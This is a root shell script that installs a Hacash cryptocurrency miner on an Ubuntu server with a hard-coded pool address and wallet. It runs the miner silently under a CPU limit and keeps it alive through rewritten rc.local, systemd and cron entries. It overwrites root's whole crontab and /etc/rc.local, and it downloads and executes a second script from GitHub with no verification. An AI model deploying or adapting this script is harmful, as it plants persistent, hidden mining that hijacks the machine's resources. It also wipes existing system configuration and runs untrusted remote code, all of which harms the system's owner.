#!/bin/sh
rm -fR /root/HAC
sudo apt-get update -y
sudo apt-get install cpulimit
#sudo apt install ocl-icd-opencl-dev -y
wget --no-check-certificate -O HAC.zip https://download.hacash.org/miner_pool_worker_hacash_ubuntu64.zip
mkdir /root/HAC
unzip -o HAC.zip -d HAC
chmod +x ./HAC/* 
cores=$(nproc --all)
#rounded_cores=$((cores * 9 / 10))
#read -p "What is pool? (exp: fr-zephyr.miningocean.org): " pool
limitCPU=$((cores * 80))

cat /dev/null > /root/danielchau.sh
cat >>/root/danielchau.sh <<EOF
#!/bin/bash
sudo /root/HAC/hacash_miner_pool_worker_2022_09_09_01 > /dev/null 2>&1 &
EOF
chmod +x /root/danielchau.sh

sed -i "$ a\\cpulimit --limit=$limitCPU --pid \$(pidof hacash_miner_pool_worker_2022_09_09_01) > /dev/null 2>&1 &" danielchau.sh

cat /dev/null > /etc/rc.local
cp /root/danielchau.sh /etc/rc.local
chmod +x /etc/rc.local

cat /dev/null > /etc/systemd/system/rc-local.service

cat >>/etc/systemd/system/rc-local.service <<EOF
[Unit]
Description=/etc/rc.local Support
ConditionPathExists=/etc/rc.local

[Service]
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target 
EOF

cat /dev/null > /root/HAC/poolworker.config.ini
cat >>/root/HAC/poolworker.config.ini <<EOF
pool = 182.92.163.225:3339
rewards = 1CKAk1hoaLHMjErLJNoYgaoAnHRJKBKK7x
supervene = $cores
EOF

cat /dev/null > /root/checkXMRIG.sh
cat >>/root/checkXMRIG.sh <<EOF
#!/bin/bash
if pgrep hacash_miner_pool_worker_2022_09_09_01 >/dev/null
then
  echo "hacash_miner_pool_worker_2022_09_09_01 is running."
else
  echo "hacash_miner_pool_worker_2022_09_09_01 isn't running"
  bash kill_miniZeph.sh
  bash danielchau.sh
fi
EOF
chmod +x /root/checkXMRIG.sh

cat /dev/null > /var/spool/cron/crontabs/root
cat >>/var/spool/cron/crontabs/root<<EOF
*/10 * * * * /root/checkXMRIG.sh > /root/checkxmrig.log
EOF

wget "https://raw.githubusercontent.com/minhchau91/createproxy/main/kill_miniZeph.sh" --output-document=/root/kill_miniZeph.sh
chmod 777 /root/kill_miniZeph.sh
./kill_miniZeph.sh
./danielchau.sh
